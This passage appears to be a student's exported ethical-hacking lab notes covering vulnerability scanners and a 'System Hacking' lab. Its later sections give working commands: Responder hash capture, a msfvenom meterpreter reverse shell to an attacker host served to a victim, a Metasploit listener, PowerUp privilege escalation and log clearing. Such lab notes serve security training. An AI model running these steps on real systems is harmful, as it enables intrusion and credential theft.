</p><ul id="794b016e-8485-417b-ac4c-392a0912fe2f" class="bulleted-list"><li style="list-style-type:disc"><strong>To start it, open parrot, then go to: Pentesting</strong> → <strong>Vulnerability Analysis</strong> → <strong>Openvas - Greenbone</strong> → <strong>Start Greenbone Vulnerability Manager Service</strong> → Start Greenbone Vulnerability Manager Service</li></ul><ul id="ac6f8470-c18c-4c83-bab2-7909ee443adb" class="bulleted-list"><li style="list-style-type:disc">Open localhost link 127.0.0.1:/9392/login<ul id="b61e7021-1066-40e4-a730-0caf6d7032b0" class="bulleted-list"><li style="list-style-type:circle">admin/password</li></ul></li></ul><ul id="4bcfdac2-a0e5-4966-8211-3e7f4189a375" class="bulleted-list"><li style="list-style-type:disc">To <code>scan</code> Scans → Tasks → Top left wand → Task wizard → Input IP → Start Scan<ul id="b6219d87-b00d-40f9-835b-335a8ba9dd98" class="bulleted-list"><li style="list-style-type:circle">It takes approximately 20 minutes for the scan to complete.</li></ul></li></ul><ul id="01775ab4-0ca0-4196-8ff4-dcb529a44147" class="bulleted-list"><li style="list-style-type:disc">To see <code>results</code> go to Scans → Results<ul id="4483f1ae-19df-43c7-99fc-c77e8b5fb299" class="bulleted-list"><li style="list-style-type:circle">Click on any vulnerability</li></ul><ul id="a782cbc9-2796-4282-a129-3022d0643807" class="bulleted-list"><li style="list-style-type:circle">Shows detailed information</li></ul><ul id="f7b6bd05-6ea1-4724-aef4-a97ca91117a7" class="bulleted-list"><li style="list-style-type:circle">Click again to close</li></ul></li></ul></details></li></ul><ul id="740c73bd-a4b1-42f6-bb9a-2694384ad82a" class="toggle"><li><details open=""><summary>Vulnerabiliy Assessment using Nessus</summary><p id="3ad4a7eb-b35b-4926-bab9-70110c328844" class="">Nessus is an assessment solution for identifying vulnerabilities, configuration issues, and malware, which can be used to penetrate networks. It performs vulnerability, configuration, and compliance assessment. It supports various technologies such as OSes, network devices, hypervisors, databases, tablets/phones, web servers, and critical infrastructure.Nessus is an assessment solution for identifying vulnerabilities, configuration issues, and malware, which can be used to penetrate networks. It performs vulnerability, configuration, and compliance assessment. It supports various technologies such as OSes, network devices, hypervisors, databases, tablets/phones, web servers, and critical infrastructure.</p><p id="45bd5323-f99f-49df-94b2-d77bffb9f914" class="">
</p><ul id="15effa01-1763-4aee-ba40-b7088d83ba17" class="bulleted-list"><li style="list-style-type:disc">Go to https://localhost:8834/<ul id="fe2c9a91-a544-481c-99d2-da6b29e89823" class="bulleted-list"><li style="list-style-type:circle">Admin/password</li></ul></li></ul><ul id="e94bcc9e-fcbb-49c8-a4ed-cca2847bc798" class="bulleted-list"><li style="list-style-type:disc">Prepare a Scan<ul id="e1041f56-7928-4677-bb5a-ca20ed448583" class="bulleted-list"><li style="list-style-type:circle">Policies → Create a new policy → Advanced Scan → NetworkScan_Policy (or any name you like)</li></ul><ul id="45ae4bbd-072c-4b45-b2f5-797431869230" class="bulleted-list"><li style="list-style-type:circle">DISCOVERY → Disable <code>Ping the remote host</code></li></ul><ul id="88f5d326-e771-4299-831e-0f7445554903" class="bulleted-list"><li style="list-style-type:circle">Port Scanning → Check <code>Verify open TCP ports found by local port enumerators</code></li></ul><ul id="fe5e6874-1afd-4bea-a816-5ca8c34ef986" class="bulleted-list"><li style="list-style-type:circle">ADVANCED → Performance Options → Max number of concurrent TCP sessions per host → Unlimited</li></ul><ul id="574d4f2a-b052-40a7-8795-9a14a14abefb" class="bulleted-list"><li style="list-style-type:circle">ADVANCED → Performance Options → Max number of concurrent TCP sessions per scan→ Unlimited</li></ul><ul id="b420540b-e8e5-461e-9ed5-81fe52f3dfae" class="bulleted-list"><li style="list-style-type:circle">If you have credentials → Credentials Tab → Add windows credentials</li></ul><ul id="f8b9807e-22ba-4e4b-b72f-97c4e0ab64fc" class="bulleted-list"><li style="list-style-type:circle">Plugins Tab → Add any plugin</li></ul><ul id="9efa9338-d8db-430c-9ace-ab71e3bd4cea" class="bulleted-list"><li style="list-style-type:circle">Click <code>Save</code></li></ul><p id="fe6cd1ec-0143-418d-b52c-a6d029847fcb" class="">
</p></li></ul><ul id="c5cdda21-f967-4224-b69a-9758ed1b1c8c" class="bulleted-list"><li style="list-style-type:disc">Launch a scan<ul id="4a9c3eea-79bf-4900-8b28-5dbf1f39a5a5" class="bulleted-list"><li style="list-style-type:circle">My scans → Create a new scan → User Defined → NetworkScan_Policy (or what you named it)</li></ul><ul id="2261ebd0-7b75-4550-a66c-8e812ab0c68e" class="bulleted-list"><li style="list-style-type:circle">Add Targets</li></ul><ul id="819eec1c-c69b-4817-9d08-b0b3f6c51f6b" class="bulleted-list"><li style="list-style-type:circle">Schedule → Switch off <code>Enabled</code></li></ul><ul id="a535f5af-5a6a-470f-896f-18ec7285481f" class="bulleted-list"><li style="list-style-type:circle">Click <code>Save</code> → Click <code>Launch</code> (under save)<ul id="a74c8966-bed1-43b5-8598-0b6c2e430402" class="bulleted-list"><li style="list-style-type:square">It takes approximately 15-20 minutes for the scan.</li></ul></li></ul><p id="e6f777c9-84f5-45f5-937a-0e8193f805ae" class="">
</p></li></ul><ul id="b88020ac-a108-4003-a46d-14e54a24b7c3" class="bulleted-list"><li style="list-style-type:disc">Generate a report<ul id="70da5066-c5d2-4ace-9ec8-84bf97c55c62" class="bulleted-list"><li style="list-style-type:circle">When scan is completed click on top right button <code>Report</code></li></ul><ul id="9686f850-2c3d-4aea-8ad8-198b8d18d4c8" class="bulleted-list"><li style="list-style-type:circle">Click <code>HTML</code>  → Click <code>Generate Report</code></li></ul></li></ul><p id="fab98363-2d8d-4d21-81e3-131651551480" class="">
</p><p id="77c16cfb-3831-4104-bd19-37acd3a58e31" class="">
</p></details></li></ul><ul id="d1a2d441-5d63-4c9c-abeb-e3fcb4c68bfd" class="toggle"><li><details open=""><summary>Vulnerability Assessment using CGI ScannerNikto</summary><p id="2bc476b0-f32c-4ec8-9683-33544e3676b4" class="">Nikto is an Open Source (GPL) web server scanner that performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers. It also checks for server configuration items such as the presence of multiple index files and HTTP server options; it will also attempt to identify installed web servers and software.</p><p id="02bb6afe-5d3b-47ee-9c41-b7e74396fee5" class="">
</p><ul id="8c0e8b07-40a5-4353-bf37-66d36ba9db3f" class="bulleted-list"><li style="list-style-type:disc">For help: <code>nikto -h</code> or <code>nikto -H</code> for full commands</li></ul><ul id="7a7b2ef6-c78a-4d2d-ab99-c8dc0332f90e" class="bulleted-list"><li style="list-style-type:disc">Tuning Scan:<ul id="818a5baf-9c46-4ab2-ba73-08e606818466" class="toggle"><li><details open=""><summary>What it is</summary><p id="f74c9782-1dd2-49a9-a500-6ea7c1774951" class="">A tuning scan can be used to decrease the number of tests performed against a target. </p><p id="82f5715a-f363-4b74-bb22-de0e780aa2de" class="">By specifying the type of test to include or exclude, faster and focused testing can be completed. </p><p id="bee0f71b-9957-4250-af45-cbf8f9006a6b" class="">This is useful in situations where the presence of certain file types such as XSS or simply “interesting” files is undesired.</p><p id="e6d8d1be-1935-4712-9d61-c3f3db7dda65" class="">
</p></details></li></ul><ul id="1d45bfaf-861f-47f9-8bba-688b63175fc0" class="bulleted-list"><li style="list-style-type:circle"><code>nikto -h &lt;target&gt; -Tuning -x</code><ul id="0ff7a6bb-7092-4770-8c7e-530cdb68c1ac" class="bulleted-list"><li style="list-style-type:square"><code>-h</code> for host</li></ul><ul id="062407e0-06d5-460d-90b8-c5e38e2231e1" class="bulleted-list"><li style="list-style-type:square"><code>-x</code> for reverse tuning, includes all tuning options except those specified</li></ul><ul id="73a0b651-332c-4943-a445-8f7515698458" class="bulleted-list"><li style="list-style-type:square">The scan takes approximately 10 minutes to complete.</li></ul></li></ul><ul id="74e482b5-c127-423a-956a-37dd51267dd7" class="bulleted-list"><li style="list-style-type:circle"><code><strong>nikto -h &lt;target&gt; -Cgidirs all</strong></code><ul id="2050e530-faa2-4a2f-9c78-b6029eecf65a" class="bulleted-list"><li style="list-style-type:square"><code><strong>-Cgidirs</strong></code> scans the specified CGI directories; users can use filters such as <strong>“none”</strong> or <strong>“all”</strong> to scan all CGI directories or none).</li></ul><ul id="0127be0c-4c53-4772-8b59-8795d5b4d14b" class="bulleted-list"><li style="list-style-type:square">Task 3, Obj 10</li></ul></li></ul><ul id="3d170028-3b96-45e8-a931-e795b52c62eb" class="bulleted-list"><li style="list-style-type:circle"><code><strong>nikto -h &lt;target&gt; -o &lt;file&gt;name</strong></code><code> </code><code><strong>-F txt</strong></code><ul id="e44846ba-4e7d-491a-b6f3-ac2cd5752d96" class="bulleted-list"><li style="list-style-type:square">Output to a text file</li></ul></li></ul></li></ul></details></li></ul></details></li></ul><ul id="27f0e904-9e10-4202-baa6-a1dc7dd04a30" class="toggle"><li><details open=""><summary>Lab 5 - System Hacking</summary><ul id="9009cc07-8c01-4159-bb89-f5c29a2c9fe3" class="bulleted-list"><li style="list-style-type:disc">You first obtain information  during the footprinting, scanning, enumeration, and vulnerability analysis phases, which can be used to exploit the target system.</li></ul><ul id="8722e762-115d-401c-bd7b-34e1b6b8ec8b" class="bulleted-list"><li style="list-style-type:disc">Then you apply a methodology<ul id="53fa9fe8-0093-4e76-ad30-c7c8e5f6abdd" class="toggle"><li><details open=""><summary>Methodology</summary><ul id="1381cbf9-53b4-4ad9-b9fa-cbdea2ab0107" class="bulleted-list"><li style="list-style-type:disc"><strong>Gaining Access</strong>: Use techniques such as cracking passwords and exploiting vulnerabilities to gain access to the target system</li></ul><ul id="f99376ce-eeea-44b6-a04a-db3556e0652d" class="bulleted-list"><li style="list-style-type:disc"><strong>Escalating Privileges</strong>: Exploit known vulnerabilities existing in OSes and software applications to escalate privileges</li></ul><ul id="81e558ee-a2ca-4733-999d-bd5241b65701" class="bulleted-list"><li style="list-style-type:disc"><strong>Maintaining Access</strong>: Maintain high levels of access to perform malicious activities such as executing malicious applications and stealing, hiding, or tampering with sensitive system files</li></ul><ul id="61b5854c-fa7e-4f2b-b706-ac7cbba67c3d" class="bulleted-list"><li style="list-style-type:disc"><strong>Clearing Logs</strong>: Avoid recognition by legitimate system users and remain undetected by wiping out the entries corresponding to malicious activities in the system logs, thus avoiding detection.</li></ul></details></li></ul></li></ul><ul id="48e929c1-5d52-4c45-853e-dc4c26355ada" class="toggle"><li><details open=""><summary>Gain Access to the System</summary><ul id="e2d0fe2c-de31-40b6-b085-45a2b40feb47" class="toggle"><li><details open=""><summary>Using Responder to Crack Password (LLMNR/NBT attack)</summary><ul id="77baeac3-64ae-49d1-8954-07746781bd07" class="toggle"><li><details open=""><summary>What’s LLMR</summary><p id="ef240915-adb6-4971-8dd1-d04e251855a0" class=""><strong>LLMNR</strong> is a protocol designed for name resolution on local networks when DNS is not available. It works alongside SMB and NetBIOS to ensure that devices on a local network can resolve each other’s names. <br/>LLMNR (Link-Local Multicast Name Resolution) uses multicast instead of broadcast because with multicast, only interested devices will gain the message and respond. <br/></p><p id="4aaca4dd-f7be-4ef8-b6a8-26a1c5e9e644" class="">Only those who have subscribed to the multicast</p></details></li></ul><p id="e6e56441-65f5-4cbd-8186-78cc6db07337" class="">There is a good chance of acquiring user credentials in an internal network penetration test.</p><p id="c82f0601-8082-4c5b-b462-58d5a0037205" class="">By listening for LLMNR/NBT-NS broadcast requests, an attacker can spoof the server and send a response claiming to be the legitimate server. </p><p id="32990f0b-12c4-4fad-a836-d2d46e97e964" class="">After the victim system accepts the connection, it is possible to gain the victim’s user-credentials by using a tool such as Responder.py</p><p id="8b3b8007-aca8-455a-9a0d-67648566f90c" class="">
</p><ul id="3bd568ab-0628-41ce-9aca-904c26f21928" class="toggle"><li><details open=""><summary>Responder</summary><ul id="d35a3f4b-6a6e-45c4-84d2-324d67a3da85" class="bulleted-list"><li style="list-style-type:disc"><code>sudo responder -I eth0</code><ul id="05919b07-1070-4025-b644-74ecea29b15e" class="bulleted-list"><li style="list-style-type:circle">starts listening for events in the network interface</li></ul><ul id="33eeaeb6-dc28-437d-8211-c272d607dad0" class="bulleted-list"><li style="list-style-type:circle">It captures a hash if someone uses NTLM and accesses a network location with credentials<ul id="b95644de-60fd-4378-985e-b415b36b3ace" class="toggle"><li><details open=""><summary>How it works</summary><ul id="08f0180c-ae73-4988-a20e-2ffc2a2084f6" class="bulleted-list"><li style="list-style-type:disc">Windows sends an LLMNR query to the local network.</li></ul><ul id="f75481b3-69b7-48fc-9743-63191f993164" class="bulleted-list"><li style="list-style-type:disc">Responder, running on another device, responds to the query.</li></ul><ul id="c610c774-dc86-44f7-9a7c-b78df0ed0992" class="bulleted-list"><li style="list-style-type:disc">The client attempts to authenticate to the fake server.</li></ul><ul id="6c9bf403-161e-4f14-b61d-b4735f47a254" class="bulleted-list"><li style="list-style-type:disc">The NTLMv2 hash is sent over the network.</li></ul></details></li></ul><ul id="2f633a8a-7554-411b-a381-4b34e7f94d90" class="toggle"><li><details open=""><summary>Why NTLM and not Kerberos</summary><ul id="4e4d11a9-6498-474d-a296-c3524a6adddf" class="bulleted-list"><li style="list-style-type:disc"><strong>Kerberos</strong>:<ul id="ea5d5bb4-19fd-44f8-b8bd-bd3b725bb1cc" class="bulleted-list"><li style="list-style-type:circle"><strong>Default Authentication</strong>: In a domain environment, Kerberos is the default authentication protocol used by Windows.</li></ul><ul id="11b4a8d0-a4a6-495f-b9da-ebca162638bf" class="bulleted-list"><li style="list-style-type:circle"><strong>Requirements</strong>: Kerberos requires that both the client and server are part of the same Active Directory domain or trusted domains, and that the client can reach a Domain Controller (DC) to obtain a ticket.</li></ul></li></ul><ul id="5d537ebb-4c85-4adb-9d23-ecdcd03c27eb" class="bulleted-list"><li style="list-style-type:disc"><strong>NTLM</strong>:<ul id="f2ac8256-9a69-4d9a-8bed-6afa80514cc7" class="bulleted-list"><li style="list-style-type:circle"><strong>Fallback Authentication</strong>: NTLM is used as a fallback when Kerberos cannot be used. This can happen in the following situations:<ul id="1eff292f-99e5-4c49-a8e1-ffe364d66d69" class="bulleted-list"><li style="list-style-type:square">The client and server are in a workgroup or different domains without a trust relationship.</li></ul><ul id="34958057-0e5b-4994-932b-78c14fa811a3" class="bulleted-list"><li style="list-style-type:square">The client cannot reach the Domain Controller.</li></ul><ul id="c91bbafe-dc20-4ca6-b10f-024ebc78bed0" class="bulleted-list"><li style="list-style-type:square">Specific configurations force the use of NTLM.</li></ul></li></ul></li></ul></details></li></ul></li></ul><ul id="3b0c70c3-68ba-4573-89c3-5708b50aede0" class="bulleted-list"><li style="list-style-type:circle">Also does other things but only tested this</li></ul></li></ul><ul id="0f421242-a676-4255-959a-ba10ca18f51b" class="bulleted-list"><li style="list-style-type:disc">Can use john the ripper to crack it</li></ul><ul id="5ba01af4-463f-417b-8167-6e04f81d27c1" class="bulleted-list"><li style="list-style-type:disc">LLMNR and NBT-NS can be disabled via Group Policy to prevent fallback name resolution method that can be exploited</li></ul></details></li></ul><p id="3742ec89-ecde-4e11-b7bb-c4c14b2e228c" class="">
</p></details></li></ul><ul id="b665f8a8-da7e-45bd-8e73-783bf25b212e" class="toggle"><li><details open=""><summary>L0phtCrack 7</summary><ul id="721029dd-260d-4acc-b902-8f5726fe2581" class="bulleted-list"><li style="list-style-type:disc">Connects through SMB using credentials, or locally and tries to crack passwords</li></ul><p id="3c4a5d5c-bde6-45a6-bb73-ab81ca2a0c8a" class="">
</p><ul id="25defa07-6129-49e8-bf06-d60292729966" class="bulleted-list"><li style="list-style-type:disc">Its used as a windows executable</li></ul><ul id="fffdf2b6-9406-4b04-bd1b-0ddd6b10a4b4" class="bulleted-list"><li style="list-style-type:disc">Select <code>Password Auditing Wizard</code>, <code>Windows</code>,  <code>A remote machine</code></li></ul><ul id="6cb63aa8-9c5a-43d4-9cb1-948ceee5e8b4" class="bulleted-list"><li style="list-style-type:disc">Set host,  <code>Use Specific User Credentials</code></li></ul><ul id="206d2173-39fd-4890-aadf-026b89a1096e" class="bulleted-list"><li style="list-style-type:disc">Type credentials and domain</li></ul><ul id="a28fb362-4af3-4840-940d-27772cfa80ca" class="bulleted-list"><li style="list-style-type:disc">Select <code>Thorough Password Audit</code>, <code>Generate Report</code></li></ul><ul id="8f629a1c-36d5-4d01-a489-b86d121867d4" class="bulleted-list"><li style="list-style-type:disc">Select <code>Run this job immediately</code></li></ul></details></li></ul><ul id="a445e859-48bf-494e-ad78-d1ae9b73256f" class="toggle"><li><details open=""><summary>Use Exploit Sites</summary><ul id="fa683e1a-78f2-4d91-8ce1-a40f5a763c49" class="bulleted-list"><li style="list-style-type:disc">Go to <code>exploit-db.com</code></li></ul><ul id="5cb3a852-73d8-4f88-a88b-0a71f8accf66" class="bulleted-list"><li style="list-style-type:disc">On the side, select <code>Search EDB</code></li></ul><ul id="54c48183-9323-443f-905a-bf3ff9f6d8a2" class="bulleted-list"><li style="list-style-type:disc">On Platform, select <code>Windows_x86-64</code></li></ul><ul id="cc038fbc-bcbf-4ba9-a268-83c3bf0054f6" class="bulleted-list"><li style="list-style-type:disc">Click on any vulnerability</li></ul><ul id="3dc74e0e-791f-4100-91ff-3a60650e68c6" class="bulleted-list"><li style="list-style-type:disc">Download or follow intructions</li></ul><p id="1fce150a-01cf-4659-8373-7f1e3985bfab" class="">
</p><ul id="4345f61a-bd31-41d8-859c-a1d3dcb6c4a1" class="toggle"><li><details open=""><summary>Others</summary><ul id="9996a1c8-e6b5-4a30-a623-3be817d2d6d9" class="bulleted-list"><li style="list-style-type:disc">VulnDB vuldb.com</li></ul><ul id="0332e0d3-93d9-4a6f-98a5-228d250fb2ca" class="bulleted-list"><li style="list-style-type:disc">Mitre CVE cve.mitre.org</li></ul><ul id="03011de1-34ce-47b0-aca0-02962947a167" class="bulleted-list"><li style="list-style-type:disc">Vulners vulners.com</li></ul><ul id="122ca41b-eb3e-4537-9f96-1908e36b932d" class="bulleted-list"><li style="list-style-type:disc">CIRCL CVE Searchcve.circl.lu</li></ul></details></li></ul></details></li></ul><ul id="717ef899-d87f-4e54-bc79-95591a64afc6" class="toggle"><li><details open=""><summary>Exploit Client Side to establish VNC Session</summary><p id="a4065c71-5def-46e0-9926-dcc4f6de0c2c" class="">We will use a simple msfvenom script to run on the attacker</p><p id="c41101a3-5621-4177-bf20-3a844cf85194" class="">We will then escalate privilages using PowerUp.ps1 and run vnc</p><p id="c27a06e3-7596-48de-845f-8118f40f7e3b" class="">
</p><ul id="a47ff6ea-fe98-40df-8aac-a5f1f41b2f60" class="bulleted-list"><li style="list-style-type:disc">Create an msfvenom reverse shell<ul id="2d853f3b-29fb-4e7b-95c1-efbe720d727a" class="bulleted-list"><li style="list-style-type:circle"><code><strong>msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=&lt;attacker ip&gt; LPORT=444 -o test.exe</strong></code></li></ul></li></ul><ul id="a157bd7d-cf69-4286-a12a-97e25ed0ba28" class="bulleted-list"><li style="list-style-type:disc">Share this file to the victim<ul id="aaa7adba-3953-42ec-aac6-f07d497fb358" class="bulleted-list"><li style="list-style-type:circle"><code>mkdir /var/www/html/share</code> </li></ul><ul id="be30450e-e147-4e28-9d6a-b69cd15f35da" class="bulleted-list"><li style="list-style-type:circle"><code>chmod  -R 755 /var/www/html/share</code></li></ul><ul id="d4f3c95a-8f66-4a71-a470-e2c4f8e255e8" class="bulleted-list"><li style="list-style-type:circle"><code>cp /home/attacker/Desktop/test.exe /var/www/html/share</code> </li></ul><ul id="16118928-2dba-41f2-b3d3-778f1899e879" class="bulleted-list"><li style="list-style-type:circle"><code>service apache2 start</code></li></ul></li></ul><ul id="d321a8d7-2895-4aa0-b5d9-a33e8c26f0a6" class="bulleted-list"><li style="list-style-type:disc">Start the listener<ul id="ab340438-8ca0-41b8-99cb-f94d1bb3e5f4" class="bulleted-list"><li style="list-style-type:circle"><code>msfconsole</code></li></ul><ul id="3fb2025d-1690-433f-858c-5a2f526e44e7" class="bulleted-list"><li style="list-style-type:circle"><code>use exploit/multi/handler</code></li></ul><ul id="747127ef-ba74-4f31-ab0b-5fd4a10cc4ad" class="bulleted-list"><li style="list-style-type:circle"><code>set payload windows/meterpreter/reverse_tcp</code></li></ul><ul id="973a1721-b4f9-46af-a923-16dce79090e8" class="bulleted-list"><li style="list-style-type:circle"><code>set LHOST &lt;attacker&gt;</code></li></ul><ul id="774dc5b5-fb2a-41b0-b79b-a7f336f3960f" class="bulleted-list"><li style="list-style-type:circle"><code>set LPORT 444</code></li></ul><ul id="67afceca-1703-4fc6-89c4-ec5e1a3d60ec" class="bulleted-list"><li style="list-style-type:circle"> <code>exploit</code></li></ul></li></ul><ul id="ce97e616-77be-4c77-b0bd-502c898cc65f" class="bulleted-list"><li style="list-style-type:disc">Infect victim with malicious file<ul id="eff5e10e-1294-42cc-8a8c-bc513726e6c9" class="bulleted-list"><li style="list-style-type:circle">Go to <code>http://10.10.1.13/share</code></li></ul><ul id="37395978-a572-4bec-91c2-cb6b40dcd2ec" class="bulleted-list"><li style="list-style-type:circle">Download and run <code>test.exe</code></li></ul></li></ul><p id="482e2ed2-78ee-4382-9fee-a198a3167d80" class="">
</p><ul id="129a08b0-73c7-4e8e-849a-a6dedddb5325" class="bulleted-list"><li style="list-style-type:disc">Meterpreter shell actions<ul id="2416f306-95a4-4e90-b4e6-7db6a56a8930" class="bulleted-list"><li style="list-style-type:circle"><code>sysinfo</code><ul id="44a3eb54-90d6-4e48-a765-40fdaaa9618b" class="bulleted-list"><li style="list-style-type:square">shows information about the system</li></ul></li></ul><ul id="30e2d13a-1ab3-44d5-96e3-95844893a75a" class="bulleted-list"><li style="list-style-type:circle"><code>upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1</code><ul id="5b8eba0d-a85a-4869-bbfd-adc79bb91f3e" class="bulleted-list"><li style="list-style-type:square">Privilage escalation script</li></ul><ul id="a9cdbc62-e3b2-4659-862c-4f0ef2ea374f" class="bulleted-list"><li style="list-style-type:square">Enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. </li></ul><ul id="832a6114-a3c0-4bb2-89e9-4e96a2e78b2a" class="bulleted-list"><li style="list-style-type:square">It utilizes various service abuse checks, .dll hijacking opportunities, registry checks, etc. to enumerate common elevation methods for a target system.</li></ul></li></ul><ul id="75bde786-3d39-42ef-8088-52d48b293e9e" class="bulleted-list"><li style="list-style-type:circle">Type <code>shell</code><ul id="5cec747a-b9ea-41b9-b1e4-0813db29d571" class="bulleted-list"><li style="list-style-type:square">to enter remote shell</li></ul></li></ul><ul id="6cab91c2-9897-40fa-9cd5-59d9f575176b" class="bulleted-list"><li style="list-style-type:circle">Type <code>powershell -ExecutionPolicy Bypass -Command &quot;. .\PowerUp.ps1;Invoke-AllChecks&quot;</code><ul id="c6deb844-1020-48a5-89b3-ec8136243b07" class="bulleted-list"><li style="list-style-type:square">Will runnmutliple methods to escalate privilages</li></ul></li></ul><ul id="21d17a87-9683-40af-ad01-1b3646f2c090" class="bulleted-list"><li style="list-style-type:circle">Type <code>exit</code> to leave the shell</li></ul></li></ul><ul id="a6710667-768e-4378-8d5b-b9607e772ee4" class="bulleted-list"><li style="list-style-type:disc">Type <code>run vnc</code> to install and run a vnc server<p id="d17ef365-ed0a-47e9-928c-46a386affa3d" class="">
</p></li></ul></details></li></ul><ul id="4f90b0b5-1bb7-4b12-94cf-655580458286" class="toggle"><li><details open=""><summary>Using Armitage to gain access to a remote system</summary><ul id="a1ab6203-87f0-4787-9799-8a84d0d88655" class="toggle"><li><details open=""><summary>What is Armitage</summary><p id="babf8118-8f94-4966-a5dc-15d93864eaed" class="">Its a scriptable red team collaboration tool for Metasploit that visualizes targets, recommends exploits, and exposes the advanced post-exploitation features in the framework.</p><p id="a9615a30-ee88-495d-a6d4-e7b1ea366e5f" class="">Using this tool, you can create sessions, share hosts, capture data, downloaded files, communicate through a shared event log, and run bots to automate pen testing tasks.</p></details></li></ul><p id="3ed8bbb1-45bf-432e-99aa-de1486f6fea6" class="">
</p><ul id="a433ed00-b138-4ae6-92ba-219cac01d0c0" class="toggle"><li><details open=""><summary>Setup</summary><ul id="5398e8ef-eb14-4e52-801b-35ee88ec23f9" class="bulleted-list"><li style="list-style-type:disc"><code>service postgresql start</code></li></ul><ul id="e597c6a3-096b-47f4-aacf-da9e46977cb6" class="bulleted-list"><li style="list-style-type:disc">Start Applications → Pentesting → Exploitation Tools → Metasploit Framework → armitage</li></ul><ul id="e5f9c6d0-bb33-415c-b938-7ad3f56c2913" class="bulleted-list"><li style="list-style-type:disc">Click <code>Connect</code> and <code>Yes</code></li></ul></details></li></ul><ul id="9ca2037e-b8d2-4be1-963f-f278d6823abb" class="toggle"><li><details open=""><summary>Scan</summary><ul id="40d4b323-0d2e-44b5-b3fa-164971125a31" class="bulleted-list"><li style="list-style-type:disc">Hosts → Nmap Scan → Intense Scan → Input Range</li></ul><ul id="1f2952a0-17d9-4a5c-a190-ed97db7f2fcd" class="bulleted-list"><li style="list-style-type:disc">Shows targets on screen</li></ul></details></li></ul><ul id="95d3b731-866e-49e4-9ea7-6d1c01729ad6" class="toggle"><li><details open=""><summary>Create reverse payload handler</summary><ul id="938dec25-68a8-4cf1-ab55-38bb0bc660c3" class="bulleted-list"><li style="list-style-type:disc">Select target</li></ul><ul id="411ae246-7645-43c0-96ba-54c7638804b9" class="bulleted-list"><li style="list-style-type:disc">Left Pane → Windows → Meterpreter → <code>meterpreter_reverse_tcp</code></li></ul><ul id="51296f2c-dbe0-4238-8de5-7a18480777c7" class="bulleted-list"><li style="list-style-type:disc">Double click and set <code>LPORT to 444</code></li></ul><ul id="da57727d-2dcc-49e8-94dc-72dae9333892" class="bulleted-list"><li style="list-style-type:disc">Set Output to <code>exe</code></li></ul><ul id="04f7e714-0d01-4c92-b035-af12c2ee21ca" class="bulleted-list"><li style="list-style-type:disc">Click <code>Launch</code></li></ul><ul id="48c40852-4b4a-4f80-b7ee-b5bc863578f5" class="bulleted-list"><li style="list-style-type:disc">Save to Desktop</li></ul><ul id="b1ab27fc-2720-46f6-9e3c-60c1f363f41d" class="bulleted-list"><li style="list-style-type:disc">Run in on the victim machine<ul id="a5cf7fb0-e6f7-4713-86fe-65d16f0886bd" class="toggle"><li><details open=""><summary>How to run it</summary><ul id="0d607b85-106b-4b04-bcee-6e052a560a2b" class="bulleted-list"><li style="list-style-type:disc">Share this file to the victim<ul id="e042203d-463b-4dd6-9749-441f6360cdf0" class="bulleted-list"><li style="list-style-type:circle"><code>mkdir /var/www/html/share</code> </li></ul><ul id="a459984c-7ef6-465d-8c7e-f5c2ac2b311b" class="bulleted-list"><li style="list-style-type:circle"><code>chmod  -R 755 /var/www/html/share</code></li></ul><ul id="9ed2b064-95ef-497f-8560-28a337106fe0" class="bulleted-list"><li style="list-style-type:circle"><code>cp /home/attacker/Desktop/test.exe /var/www/html/share</code> </li></ul><ul id="6f6ca3eb-8c97-42b0-838f-e7c9cd1c5d6f" class="bulleted-list"><li style="list-style-type:circle"><code>service apache2 start</code></li></ul></li></ul><ul id="9765ecaf-5d60-4fb3-b681-817c35badcf4" class="bulleted-list"><li style="list-style-type:disc">Start the listener<ul id="332f4c75-c216-41e4-81ab-1a0c1f1f706f" class="bulleted-list"><li style="list-style-type:circle"><code>msfconsole</code></li></ul><ul id="1789958b-6950-4655-9c83-2d34fcc6fe14" class="bulleted-list"><li style="list-style-type:circle"><code>use exploit/multi/handler</code></li></ul><ul id="fd552975-2073-407c-953b-9845fe201553" class="bulleted-list"><li style="list-style-type:circle"><code>set payload windows/meterpreter/reverse_tcp</code></li></ul><ul id="7dab4e87-e1bb-4eec-a80b-dbbb1055be81" class="bulleted-list"><li style="list-style-type:circle"><code>set LHOST &lt;attacker&gt;</code></li></ul><ul id="698bbebc-2e8e-47b1-be75-c321dc4e6d5d" class="bulleted-list"><li style="list-style-type:circle"><code>set LPORT 444</code></li></ul><ul id="67595ab2-0e9d-42dd-925b-1729ca8f9c1c" class="bulleted-list"><li style="list-style-type:circle"> <code>exploit</code></li></ul></li></ul><ul id="95805f8c-164b-4d96-b61f-65cb4e0cff75" class="bulleted-list"><li style="list-style-type:disc">Infect victim with malicious file<ul id="51711061-fd27-4e73-98bd-650a26dd126b" class="bulleted-list"><li style="list-style-type:circle">Go to <code>http://10.10.1.13/share</code></li></ul><ul id="a198be27-abf9-42f4-897a-52aacd191628" class="bulleted-list"><li style="list-style-type:circle">Download and run <code>test.exe</code></li></ul></li></ul></details></li></ul></li></ul></details></li></ul><ul id="ec2047ef-963f-4f17-92ff-347ebce2c8f2" class="toggle"><li><details open=""><summary>Start multi handler</summary><ul id="cb836c31-5909-429b-9c0b-9de4f5d59e3a" class="bulleted-list"><li style="list-style-type:disc">Select target</li></ul><ul id="cf989d03-e498-4e46-a72f-649d4c202e9e" class="bulleted-list"><li style="list-style-type:disc">Left Pane → Windows → Meterpreter → <code>meterpreter_reverse_tcp</code></li></ul><ul id="e4d34e48-7ce7-44d4-9beb-94697742ea65" class="bulleted-list"><li style="list-style-type:disc">Double click and set <code>LPORT to 444</code></li></ul><ul id="de174524-dc9d-4d64-93f6-df19bb307737" class="bulleted-list"><li style="list-style-type:disc">Click <code>Launch</code></li></ul></details></li></ul><ul id="bee18a20-79d4-4e82-ac80-93a27ec58745" class="toggle"><li><details open=""><summary>Post exploitation</summary><ul id="a97fc3f7-18c0-4b2c-bb2f-04dde696644c" class="bulleted-list"><li style="list-style-type:disc">Gain shell<ul id="bb4c726e-aea3-47c9-9ca9-ff0acaa28233" class="bulleted-list"><li style="list-style-type:circle">Right Click on machine → Meterpreter → Interact → Meterpreter Shell</li></ul></li></ul><ul id="77e60318-36b2-4f3b-aa7a-9900fe1e910f" class="bulleted-list"><li style="list-style-type:disc">Browser files<ul 